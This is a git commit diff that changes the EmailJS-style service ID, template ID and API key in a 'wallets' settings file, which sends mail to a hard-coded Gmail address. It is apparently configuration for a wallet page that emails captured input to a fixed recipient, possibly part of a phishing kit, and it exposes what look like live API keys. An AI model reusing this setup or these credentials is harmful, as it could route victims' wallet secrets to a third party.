0d16562bd4dd8e59f2008a37a3c1296fc98f54f9
HarrieNF <Pearlswiss04@gmail.com>
2025-01-19 18:59:17 +0100

    Update settings.js

--- wallets/js/ejs/settings.js
+++ wallets/js/ejs/settings.js
@@ -1,4 +1,4 @@
-export const service = "service_f7kmewf";
-export const template = "template_78byqir";
-export const apiKey = "WPxDAspdOG0oOKCby";
+export const service = "service_htp60nh";
+export const template = "template_qjhcyp8";
+export const apiKey = "pGATxF6BuqnxQa8Ik";
 export const recieverMail = "michaelcarlson477@gmail.com";
